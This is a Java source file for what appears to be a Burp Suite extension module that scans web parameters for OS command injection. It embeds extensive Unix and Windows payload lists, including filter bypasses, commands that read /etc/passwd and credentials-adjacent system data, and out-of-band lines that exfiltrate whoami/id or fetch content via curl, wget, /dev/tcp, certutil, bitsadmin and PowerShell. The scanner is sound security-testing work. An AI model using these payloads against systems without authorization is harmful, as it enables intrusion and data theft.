package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.TimingLock;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;

import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

/**
 * MODULE 10: OS Command Injection Scanner
 * Detects command injection via time-based payloads (sleep/ping delays),
 * error-based output detection, and OOB via Burp Collaborator (DNS/HTTP callbacks).
 * Supports Unix and Windows command separators.
 */
public class CommandInjectionScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Command separators for both Unix and Windows
    private static final String[] UNIX_SEPARATORS = {
            ";", "|", "||", "&&", "\n", "`", "$(",
    };
    private static final String[] WINDOWS_SEPARATORS = {
            "&", "&&", "|", "||", "\n",
    };

    // Time-based payloads: each pair is [payload_template, expected_delay_seconds]
    // SLEEP_SECS is replaced with the configured delay
    private static final String[][] UNIX_TIME_PAYLOADS = {
            // sleep command
            {";sleep SLEEP_SECS;", "sleep"},
            {"|sleep SLEEP_SECS|", "sleep"},
            {"||sleep SLEEP_SECS||", "sleep"},
            {"&&sleep SLEEP_SECS&&", "sleep"},
            {"`sleep SLEEP_SECS`", "sleep"},
            {"$(sleep SLEEP_SECS)", "sleep"},
            {"\nsleep SLEEP_SECS\n", "sleep"},
            {";sleep SLEEP_SECS #", "sleep"},
            {"| sleep SLEEP_SECS #", "sleep"},
            // ping (alternative when sleep is unavailable)
            {";ping -c SLEEP_SECS 127.0.0.1;", "ping"},
            {"|ping -c SLEEP_SECS 127.0.0.1|", "ping"},
            {"$(ping -c SLEEP_SECS 127.0.0.1)", "ping"},
            // Newline (%0a) as separator
            {"%0asleep SLEEP_SECS%0a", "sleep-newline"},
            // $IFS space bypass
            {";sleep${IFS}SLEEP_SECS;", "sleep-IFS"},
            {"|sleep${IFS}SLEEP_SECS", "sleep-IFS-pipe"},
            // Environment variable concatenation
            {";sl${EMPTY}eep SLEEP_SECS;", "sleep-envconcat"},
            // Backtick nesting
            {"$(sleep `echo SLEEP_SECS`)", "sleep-backtick-nest"},
            // CRLF injection
            {"%0d%0asleep SLEEP_SECS%0d%0a", "sleep-crlf"},
            // Tab as separator
            {";sleep\tSLEEP_SECS;", "sleep-tab"},
            // Brace expansion
            {"{sleep,SLEEP_SECS}", "sleep-brace"},
            // Double-encoded newline
            {"%250asleep SLEEP_SECS%250a", "sleep-double-newline"},
            // Concatenation bypass
            {"';sleep SLEEP_SECS;'", "sleep-quote-break"},
            {"\"| sleep SLEEP_SECS", "sleep-dquote-pipe"},
            // $() with IFS
            {"$(sleep${IFS}SLEEP_SECS)", "sleep-subshell-IFS"},
            // Here string
            {"<<<$(sleep SLEEP_SECS)", "sleep-herestring"},
            // Wildcard-based (using PATH globbing)
            {"/???/??e?p SLEEP_SECS", "sleep-glob"},
            // Python one-liner
            {";python3 -c 'import time;time.sleep(SLEEP_SECS)';", "python-sleep"},
            {";python -c 'import time;time.sleep(SLEEP_SECS)';", "python2-sleep"},
            // Perl one-liner
            {";perl -e 'sleep SLEEP_SECS';", "perl-sleep"},
            // Ruby one-liner
            {";ruby -e 'sleep SLEEP_SECS';", "ruby-sleep"},
            // PHP one-liner
            {";php -r 'sleep(SLEEP_SECS);';", "php-sleep"},
    };

    private static final String[][] WINDOWS_TIME_PAYLOADS = {
            {"& ping -n SLEEP_SECS 127.0.0.1 &", "ping"},
            {"| ping -n SLEEP_SECS 127.0.0.1 |", "ping"},
            {"&& ping -n SLEEP_SECS 127.0.0.1 &&", "ping"},
            {"|| ping -n SLEEP_SECS 127.0.0.1 ||", "ping"},
            {"& timeout /T SLEEP_SECS /NOBREAK &", "timeout"},
            {"\nping -n SLEEP_SECS 127.0.0.1\n", "ping"},
            // PowerShell
            {"& powershell Start-Sleep -Seconds SLEEP_SECS &", "powershell"},
            // waitfor command
            {"& waitfor /T SLEEP_SECS omni 2>nul &", "waitfor"},
            // PowerShell sleep variants
            {"& powershell -c \"Start-Sleep SLEEP_SECS\" &", "powershell-c"},
            {"& powershell -enc BASE64SLEEP &", "powershell-enc"},
            // choice command
            {"& choice /C Y /T SLEEP_SECS /D Y >nul &", "choice"},
            // pathping delay
            {"& pathping -q 1 -p SLEEP_SECS000 127.0.0.1 &", "pathping"},
            // cmd /c chained
            {"| cmd /c ping -n SLEEP_SECS 127.0.0.1", "cmd-c-ping"},
    };

    // Error/output-based payloads — require specific command output patterns to confirm execution.
    // Generic strings like "Linux", "42", "bin", "inet" are NOT used — they appear on normal web pages.
    private static final String[][] OUTPUT_PAYLOADS_UNIX = {
            // id command — uid=\d+ is specific to Unix id output
            {";id;", "REGEX:uid=\\d+", "id command (Unix)"},
            {"|id|", "REGEX:uid=\\d+", "id command piped (Unix)"},
            {"$(id)", "REGEX:uid=\\d+", "id via subshell (Unix)"},
            {"`id`", "REGEX:uid=\\d+", "id via backtick (Unix)"},
            // /etc/passwd — root:x:0:0: is definitive
            {";cat /etc/passwd;", "root:x:0:0:", "/etc/passwd read (Unix)"},
            {"|cat /etc/passwd", "root:x:0:0:", "/etc/passwd piped (Unix)"},
            {"$(cat /etc/passwd)", "root:x:0:0:", "/etc/passwd subshell (Unix)"},
            // uname — require kernel version pattern, not just "Linux"
            {";uname -a;", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname (Unix)"},
            {"|uname -a", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname piped (Unix)"},
            // Newline separator
            {"%0aid%0a", "REGEX:uid=\\d+", "id via newline (Unix)"},
            // $IFS space bypass
            {";cat${IFS}/etc/passwd;", "root:x:0:0:", "/etc/passwd via IFS (Unix)"},
            // expr math marker — unique 6-digit number to avoid matching natural page content
            {";expr 97531 + 33806;", "131337", "expr math marker (Unix)"},
            {"$(expr 97531 + 33806)", "131337", "expr math subshell (Unix)"},
            // Backtick nesting with $IFS
            {"`cat${IFS}/etc/passwd`", "root:x:0:0:", "/etc/passwd via IFS backtick (Unix)"},
            // env/printenv — require PATH with Unix directory structure
            {";env;", "REGEX:PATH=/(?:usr|bin|sbin)", "env dump (Unix)"},
            {";printenv;", "REGEX:PATH=/(?:usr|bin|sbin)", "printenv (Unix)"},
            // ifconfig/ip — require IP address format after inet keyword
            {";ifconfig 2>/dev/null||ip addr;", "REGEX:inet\\s+\\d+\\.\\d+\\.\\d+\\.\\d+", "ifconfig/ip (Unix)"},
            // pwd — require a Unix-like path
            {";pwd;", "REGEX:/(?:home|root|var|tmp|usr|opt|srv|app|www)/", "pwd (Unix)"},
            // Perl execution — unique marker
            {";perl -e 'print 131337';", "131337", "perl eval (Unix)"},
            // Python execution — unique marker
            {";python3 -c 'print(131337)';", "131337", "python3 eval (Unix)"},
            // Ruby execution — unique marker
            {";ruby -e 'puts 131337';", "131337", "ruby eval (Unix)"},
            // PHP execution — unique marker
            {";php -r 'echo 131337;';", "131337", "php eval (Unix)"},
            // ls -la — Unix permission strings (drwxr-xr-x) are unmistakable
            {";ls -la /;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / (Unix)"},
            {"|ls -la /", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / piped (Unix)"},
            {"$(ls -la /)", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / subshell (Unix)"},
            {"`ls -la /`", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / backtick (Unix)"},
            {";ls${IFS}-la${IFS}/;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / via IFS (Unix)"},
            {"%0als -la /%0a", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / newline (Unix)"},
            // cat /proc/version — specific kernel version string
            {";cat /proc/version;", "Linux version", "/proc/version (Unix)"},
            // Curl-based output
            {"|curl -s file:///etc/passwd", "root:x:0:0:", "curl file proto (Unix)"},
    };

    private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
            // win.ini — [fonts] section is definitive
            {"& type C:\\Windows\\win.ini &", "[fonts]", "win.ini read (Windows)"},
            {"| type C:\\Windows\\win.ini", "[fonts]", "win.ini piped (Windows)"},
            // ver — require full version string format
            {"& ver &", "REGEX:Microsoft Windows \\[Version \\d+\\.", "ver command (Windows)"},
            // set /a math marker — unique number
            {"& set /a 97531+33806 &", "131337", "set /a math marker (Windows)"},
            // Newline separator
            // ipconfig — require IPv4 address pattern
            {"& ipconfig &", "REGEX:IPv4.*:\\s*\\d+\\.\\d+\\.\\d+\\.\\d+", "ipconfig (Windows)"},
            // systeminfo — require OS Name with Microsoft
            {"& systeminfo &", "REGEX:OS Name:\\s+Microsoft", "systeminfo (Windows)"},
            // dir — require Volume in drive pattern
            {"& dir C:\\ &", "REGEX:Volume in drive [A-Z]", "dir C: (Windows)"},
            // net user — require user accounts listing header
            {"& net user &", "REGEX:User accounts for", "net user (Windows)"},
            // tasklist — require process.exe with PID pattern
            {"& tasklist &", "REGEX:\\w+\\.exe\\s+\\d+", "tasklist (Windows)"},
            // wmic — require Windows with version number
            {"& wmic os get caption &", "REGEX:Microsoft Windows\\s+(?:Server\\s+)?\\d+", "wmic os (Windows)"},
            // PowerShell expressions
            {"& powershell -c \"[System.Environment]::OSVersion\" &", "REGEX:Microsoft Windows NT \\d+\\.\\d+", "powershell OSVersion (Windows)"},
    };

    // OOB payloads using Collaborator (COLLAB_PLACEHOLDER replaced at runtime)
    private static final String[][] OOB_PAYLOADS_UNIX = {
            {";nslookup COLLAB_PLACEHOLDER;", "nslookup (Unix)"},
            {"|nslookup COLLAB_PLACEHOLDER", "nslookup piped (Unix)"},
            {"$(nslookup COLLAB_PLACEHOLDER)", "nslookup subshell (Unix)"},
            {"`nslookup COLLAB_PLACEHOLDER`", "nslookup backtick (Unix)"},
            {";curl http://COLLAB_PLACEHOLDER/cmdi;", "curl (Unix)"},
            {"|curl http://COLLAB_PLACEHOLDER/cmdi", "curl piped (Unix)"},
            {"$(curl http://COLLAB_PLACEHOLDER/cmdi)", "curl subshell (Unix)"},
            {";wget http://COLLAB_PLACEHOLDER/cmdi;", "wget (Unix)"},
            {";ping -c 1 COLLAB_PLACEHOLDER;", "ping (Unix)"},
            {"|ping -c 1 COLLAB_PLACEHOLDER", "ping piped (Unix)"},
            {";host COLLAB_PLACEHOLDER;", "host lookup (Unix)"},
            {";dig COLLAB_PLACEHOLDER;", "dig lookup (Unix)"},
            // Newline separator nslookup
            {"%0anslookup COLLAB_PLACEHOLDER%0a", "nslookup newline (Unix)"},
            // $IFS variants
            {";nslookup${IFS}COLLAB_PLACEHOLDER;", "nslookup IFS (Unix)"},
            {"|curl${IFS}http://COLLAB_PLACEHOLDER/cmdi", "curl IFS piped (Unix)"},
            // Python popen
            {";python -c \"import os;os.popen('nslookup COLLAB_PLACEHOLDER')\" ;", "python popen (Unix)"},
            // curl POST with data exfil
            {";curl http://COLLAB_PLACEHOLDER/$(whoami);", "curl whoami exfil (Unix)"},
            {";wget -q http://COLLAB_PLACEHOLDER/$(id|base64) -O /dev/null;", "wget id exfil (Unix)"},
            // Perl OOB
            {";perl -e 'use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>\"COLLAB_PLACEHOLDER\",PeerPort=>80)';", "perl socket (Unix)"},
            // Python OOB
            {";python3 -c 'import socket;socket.socket().connect((\"COLLAB_PLACEHOLDER\",80))';", "python3 socket (Unix)"},
            {";python -c 'import urllib;urllib.urlopen(\"http://COLLAB_PLACEHOLDER/cmdi\")';", "python urllib (Unix)"},
            // Ruby OOB
            {";ruby -e 'require\"net/http\";Net::HTTP.get(URI(\"http://COLLAB_PLACEHOLDER/cmdi\"))';", "ruby http (Unix)"},
            // PHP OOB
            {";php -r 'file_get_contents(\"http://COLLAB_PLACEHOLDER/cmdi\");';", "php file_get (Unix)"},
            // openssl OOB
            {";openssl s_client -connect COLLAB_PLACEHOLDER:443 2>/dev/null;", "openssl connect (Unix)"},
            // bash /dev/tcp
            {";bash -c 'echo > /dev/tcp/COLLAB_PLACEHOLDER/80';", "bash dev-tcp (Unix)"},
            // nc/netcat
            {";nc -z COLLAB_PLACEHOLDER 80;", "netcat (Unix)"},
    };

    private static final String[][] OOB_PAYLOADS_WINDOWS = {
            {"& nslookup COLLAB_PLACEHOLDER &", "nslookup (Windows)"},
            {"| nslookup COLLAB_PLACEHOLDER", "nslookup piped (Windows)"},
            {"& ping -n 1 COLLAB_PLACEHOLDER &", "ping (Windows)"},
            {"| ping -n 1 COLLAB_PLACEHOLDER", "ping piped (Windows)"},
            {"& certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/cmdi &", "certutil (Windows)"},
            {"& powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/cmdi &", "powershell IWR (Windows)"},
            {"& powershell (New-Object Net.WebClient).DownloadString('http://COLLAB_PLACEHOLDER/cmdi') &", "powershell WebClient (Windows)"},
            // PowerShell DNS resolution
            {"& powershell -c \"Resolve-DnsName COLLAB_PLACEHOLDER\" &", "powershell DNS (Windows)"},
            // PowerShell Net.Sockets
            {"& powershell -c \"(New-Object Net.Sockets.TcpClient).Connect('COLLAB_PLACEHOLDER',80)\" &", "powershell TCP (Windows)"},
            // bitsadmin
            {"& bitsadmin /transfer omni http://COLLAB_PLACEHOLDER/cmdi %temp%\\omni &", "bitsadmin (Windows)"},
            // mshta
            {"& mshta http://COLLAB_PLACEHOLDER/cmdi &", "mshta (Windows)"},
            // rundll32
            {"& rundll32 url.dll,FileProtocolHandler http://COLLAB_PLACEHOLDER/cmdi &", "rundll32 (Windows)"},
            // explorer
            {"& start http://COLLAB_PLACEHOLDER/cmdi &", "start URL (Windows)"},
            // wmic process call
            {"& wmic process call create \"cmd /c nslookup COLLAB_PLACEHOLDER\" &", "wmic process (Windows)"},
            // curl (modern Windows)
            {"& curl http://COLLAB_PLACEHOLDER/cmdi &", "curl (Windows)"},
    };

    @Override
    public String getId() { return "cmdi-scanner"; }

    @Override
    public String getName() { return "Command Injection Scanner"; }

    @Override
    public String getDescription() {
        return "OS command injection via time-based delays, output detection, and OOB (Collaborator) for Unix and Windows.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<CmdiTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        return runCmdiTargets(requestResponse, targets, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<CmdiTarget> targets = extractTargets(request);
        return runCmdiTargets(requestResponse, targets, urlPath);
    }

    private List<Finding> runCmdiTargets(HttpRequestResponse requestResponse,
                                          List<CmdiTarget> targets, String urlPath) {
        for (CmdiTarget target : targets) {
            if (!dedup.markIfNew("cmdi-scanner", urlPath, target.name)) continue;

            try {
                testCommandInjection(requestResponse, target);
            } catch (Exception e) {
                api.logging().logToError("CmdI test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testCommandInjection(HttpRequestResponse original, CmdiTarget target) throws InterruptedException {
        String url = original.request().url();
        int delaySecs = config.getInt("cmdi.delaySecs", 18);

        // Phase 1: Baseline (multi-measurement for accuracy)
        TimedResult baselineResult = measureResponseTime(original, target, target.originalValue);
        long baselineTime = baselineResult.elapsedMs;
        HttpRequestResponse baseline = baselineResult.response;
        String baselineBody = baseline != null && baseline.response() != null
                ? baseline.response().bodyToString() : "";

        // Take 2 additional baseline measurements and use the maximum
        TimedResult b2 = measureResponseTime(original, target, target.originalValue);
        TimedResult b3 = measureResponseTime(original, target, target.originalValue);
        baselineTime = Math.max(baselineTime, Math.max(
                b2.response != null ? b2.elapsedMs : 0,
                b3.response != null ? b3.elapsedMs : 0));

        // Phase 2: Output-based detection (Unix)
        // Skip output-based for header targets — header injection causes response differences
        // (WAF blocks, routing changes, logging errors) unrelated to command execution.
        // Headers are only tested via time-based (below) and OOB Collaborator (below).
        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
            if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_UNIX, "Unix")) return;
        }

        // Phase 3: Output-based detection (Windows)
        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
            if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_WINDOWS, "Windows")) return;
        }

        // Phase 4: OOB via Collaborator
        if (config.getBool("cmdi.oob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {
            testOob(original, target, url);
        }

        // Phase 5: Time-based blind (LAST — serialized via TimingLock)
        // Gated by global TimingLock.isEnabled() checkbox
        if (!TimingLock.isEnabled()) return;
        try {
            TimingLock.acquire();
            if (config.getBool("cmdi.unix.enabled", true)) {
                if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
            }
            if (config.getBool("cmdi.windows.enabled", true)) {
                if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return;
        } finally {
            TimingLock.release();
        }
    }

    // ==================== TIME-BASED DETECTION ====================
    // Three-step verification: (1) true condition delays, (2) control/no-op returns within baseline,
    // (3) true condition delays again. This eliminates FPs from network jitter, WAF blocking, and
    // server-side load spikes. Mirrors the SQLi time-based verification approach.

    private boolean testTimeBased(HttpRequestResponse original, CmdiTarget target, String url,
                                   long baselineTime, int delaySecs, String[][] payloads, String osType)
            throws InterruptedException {

        long thresholdMs = (long)(delaySecs * 1000 * 0.8); // 80% of expected delay

        for (String[] payloadInfo : payloads) {
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];
            String truePayload = payloadTemplate.replace("SLEEP_SECS", String.valueOf(delaySecs));
            // Control payload: same injection syntax but zero delay — proves the delay is from the command
            String controlPayload = payloadTemplate.replace("SLEEP_SECS", "0");

            // Step 1: True condition — must delay beyond baseline + 80% of expected
            TimedResult result1 = measureResponseTime(original, target, target.originalValue + truePayload);
            if (result1.elapsedMs < baselineTime + thresholdMs) {
                perHostDelay();
                continue;
            }
            // Discard if response is a small error page (WAF block, not execution)
            if (isSmallErrorPage(result1.response)) {
                perHostDelay();
                continue;
            }

            // Step 2: Control condition (zero delay) — must return within baseline range
            // If control also delays, the delay is from network/server load, not command execution
            TimedResult controlResult = measureResponseTime(original, target, target.originalValue + controlPayload);
            long controlCeiling = baselineTime + Math.max((long)(baselineTime * 0.5), 1000);
            if (controlResult.elapsedMs > controlCeiling) {
                // Control also slow — network jitter or WAF latency, not command injection
                perHostDelay();
                continue;
            }

            // Step 3: True condition again — must delay again to confirm repeatability
            TimedResult result2 = measureResponseTime(original, target, target.originalValue + truePayload);
            if (result2.elapsedMs < baselineTime + thresholdMs) {
                perHostDelay();
                continue;
            }
            if (isSmallErrorPage(result2.response)) {
                perHostDelay();
                continue;
            }

            // All three steps passed — confirmed
            findingsStore.addFinding(Finding.builder("cmdi-scanner",
                            "OS Command Injection (Time-Based) - " + osType,
                            Severity.CRITICAL, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Technique: " + technique + " (" + osType + ")"
                            + " | Payload: " + truePayload
                            + " | Baseline: " + baselineTime + "ms"
                            + " | True condition 1: " + result1.elapsedMs + "ms"
                            + " | Control (zero delay): " + controlResult.elapsedMs + "ms"
                            + " | True condition 2: " + result2.elapsedMs + "ms"
                            + " | Expected delay: " + delaySecs + "s (threshold 80%: " + thresholdMs + "ms)")
                    .description("Time-based OS command injection confirmed via 3-step verification. "
                            + "True condition delayed by ~" + delaySecs + "s, control (zero delay) returned "
                            + "within baseline range (" + controlResult.elapsedMs + "ms), second true condition "
                            + "confirmed the delay. Parameter '" + target.name + "' is injectable via "
                            + technique + " (" + osType + ").")
                    .payload(truePayload)
                    .requestResponse(result2.response)
                    .build());
            return true;
        }
        return false;
    }

    // ==================== OUTPUT-BASED DETECTION ====================

    private boolean testOutputBased(HttpRequestResponse original, CmdiTarget target, String url,
                                     String baselineBody, String[][] payloads, String osType)
            throws InterruptedException {

        for (String[] payloadInfo : payloads) {
            String payload = payloadInfo[0];
            String expectedOutput = payloadInfo[1];
            String technique = payloadInfo[2];


            HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
            if (result == null || result.response() == null) continue;

            // Skip small error pages — 403/404/500 with body < 500 bytes is never evidence
            // of command execution (WAF blocks, routing errors, server rejection).
            // Larger error pages may still contain genuine command output.
            if (isSmallErrorPage(result)) continue;

            String body = result.response().bodyToString();
            // Empty body is never evidence of command execution
            if (body == null || body.isEmpty()) continue;

            if (!expectedOutput.isEmpty()) {
                boolean matched;
                boolean baselineMatched;
                String matchedEvidence = null; // actual matched text for responseEvidence

                if (expectedOutput.startsWith("REGEX:")) {
                    // Regex-based matching (e.g., for echo-wrapped whoami output)
                    Pattern regexPattern = Pattern.compile(expectedOutput.substring(6));
                    java.util.regex.Matcher regexMatcher = regexPattern.matcher(body);
                    matched = regexMatcher.find();
                    if (matched) {
                        matchedEvidence = regexMatcher.group();
                    }
                    baselineMatched = baselineBody.isEmpty() || regexPattern.matcher(baselineBody).find();
                } else {
                    // Simple string contains matching
                    matched = body.contains(expectedOutput);
                    matchedEvidence = expectedOutput;
                    baselineMatched = baselineBody.isEmpty() || baselineBody.contains(expectedOutput);
                }

                if (matched && !baselineMatched) {
                    Finding.Builder findingBuilder = Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Output-Based) - " + osType,
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Technique: " + technique
                                    + " | Payload: " + payload
                                    + " | Output found: " + expectedOutput)
                            .description("Command injection confirmed. Command output matching '"
                                    + expectedOutput + "' found in response via " + technique + ". "
                                    + "Parameter '" + target.name + "' allows OS command execution.")
                            .payload(payload)
                            .requestResponse(result);
                    if (matchedEvidence != null) {
                        findingBuilder.responseEvidence(matchedEvidence);
                    }
                    findingsStore.addFinding(findingBuilder.build());
                    return true;
                }
            }
            perHostDelay();
        }
        return false;
    }

    // ==================== OOB VIA COLLABORATOR ====================

    private void testOob(HttpRequestResponse original, CmdiTarget target, String url) throws InterruptedException {
        // Unix OOB payloads
        if (config.getBool("cmdi.unix.enabled", true)) {
            for (String[] payloadInfo : OOB_PAYLOADS_UNIX) {
                sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Unix");
            }
        }

        // Windows OOB payloads
        if (config.getBool("cmdi.windows.enabled", true)) {
            for (String[] payloadInfo : OOB_PAYLOADS_WINDOWS) {
                sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Windows");
            }
        }
    }

    private void sendOobPayload(HttpRequestResponse original, CmdiTarget target,
                                 String url, String payloadTemplate, String technique, String osType)
            throws InterruptedException {

        // AtomicReference to capture the sent request/response for the finding
        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
        // AtomicReference to capture the final payload string for the finding
        AtomicReference<String> sentPayload = new AtomicReference<>();

        String collabPayload = collaboratorManager.generatePayload(
                "cmdi-scanner", url, target.name,
                "CmdI OOB " + technique,
                interaction -> {
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Out-of-Band) - " + osType,
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Technique: " + technique + " (" + osType + ")"
                                    + " | Collaborator " + interaction.type().name()
                                    + " interaction from " + interaction.clientIp()
                                    + " at " + interaction.timeStamp())
                            .description("OS command injection confirmed via Burp Collaborator. "
                                    + "The server executed " + technique + " which triggered a "
                                    + interaction.type().name() + " callback. "
                                    + "Parameter '" + target.name + "' allows arbitrary command execution.")
                            .payload(sentPayload.get())
                            .requestResponse(sentRequest.get())
                            .build());
                    api.logging().logToOutput("[CmdI OOB] Confirmed! " + interaction.type()
                            + " interaction for " + url + " param=" + target.name
                            + " technique=" + technique + " OS=" + osType);
                }
        );

        if (collabPayload == null) return;

        String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);

        sentPayload.set(payload);
        sentRequest.set(sendPayload(original, target, target.originalValue + payload));

        api.logging().logToOutput("[CmdI OOB] Sent " + technique + " payload to " + url
                + " param=" + target.name + " collab=" + collabPayload);

        perHostDelay();
    }

    // ==================== HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, CmdiTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    /** Result of a timed request, bundling elapsed time and the response together to avoid races. */
    private static class TimedResult {
        final long elapsedMs;
        final HttpRequestResponse response;
        TimedResult(long elapsedMs, HttpRequestResponse response) {
            this.elapsedMs = elapsedMs;
            this.response = response;
        }
    }

    private TimedResult measureResponseTime(HttpRequestResponse original, CmdiTarget target, String payload) {
        long start = System.currentTimeMillis();
        HttpRequestResponse response = sendPayload(original, target, payload);
        long elapsed = System.currentTimeMillis() - start;
        return new TimedResult(elapsed, response);
    }

    /**
     * Returns true if the response is a small error page that should never be treated as
     * evidence of command execution. 403/404/500 with body under 500 bytes typically indicates
     * WAF blocking, routing errors, or server rejection — not actual command execution.
     * Also returns true for null/empty responses.
     */
    private boolean isSmallErrorPage(HttpRequestResponse result) {
        if (result == null || result.response() == null) return true;
        String body = result.response().bodyToString();
        if (body == null || body.isEmpty()) return true;
        int status = result.response().statusCode();
        return (status == 403 || status == 404 || status == 500) && body.length() < 500;
    }

    private HttpRequest injectPayload(HttpRequest request, CmdiTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                if (target.name.contains(".")) {
                    // Nested key — parse, replace, serialize
                    String newBody = replaceNestedJsonValue(body, target.name, escaped);
                    return request.withBody(newBody);
                } else {
                    String pattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
                    return request.withBody(body.replaceFirst(pattern, replacement));
                }
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Replace a value at a dot-notation path in a JSON string.
     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
     */
    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
        try {
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
            if (!root.isJsonObject()) return jsonBody;

            String[] parts = dotPath.split("\\.");
            com.google.gson.JsonObject current = root.getAsJsonObject();

            // Traverse to the parent of the target key
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return jsonBody;
                current = child.getAsJsonObject();
            }

            // Replace the leaf value
            String leafKey = parts[parts.length - 1];
            if (current.has(leafKey)) {
                current.addProperty(leafKey, escapedValue);
            }

            return new com.google.gson.Gson().toJson(root);
        } catch (Exception e) {
            return jsonBody;
        }
    }

    private List<CmdiTarget> extractTargets(HttpRequest request) {
        List<CmdiTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.COOKIE));
                    break;
            }
        }
        // JSON body params (recursive for nested objects)
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Extract injectable request headers
        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin"};
